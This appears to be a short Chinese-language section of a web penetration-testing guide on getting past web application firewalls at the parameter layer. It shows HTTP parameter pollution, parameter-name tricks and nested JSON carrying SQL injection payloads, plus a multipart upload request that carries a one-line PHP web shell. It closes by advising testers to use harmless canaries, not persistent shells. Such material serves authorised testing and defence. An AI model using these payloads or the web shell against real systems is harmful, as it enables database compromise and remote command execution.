# 参数层绕过
## 3.1 参数污染（HPP）

不同框架处理重复参数的方式不同：

```
原始: ?id=1' OR '1'='1
HPP:  ?id=1&id=' OR '1'='1

# ASP/IIS: 拼接 → "1,' OR '1'='1"
# PHP: 取最后一个 → "' OR '1'='1"
# Python/Flask: 取第一个 → "1"
# Java: 取第一个 → "1"
```

WAF 如果取第一个值检查、后端取最后一个值使用 → 绕过。

## 3.2 参数名变体

```
# 数组语法
id[]=1' OR '1'='1
id[0]=1&id[1]=' OR '1'='1

# 不同编码的参数名
%69%64=1' OR '1'='1  （id 的 URL 编码）

# JSON 嵌套
{"user":{"name":"admin' OR '1'='1"}}
```

## 3.3 Multipart 边界利用

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------BOUNDARY--
```

WAF 可能只检查 Content-Type 声明而不解析实际内容。SRC/红队：RCE 只写无害短 txt canary，不要持久化 webshell。
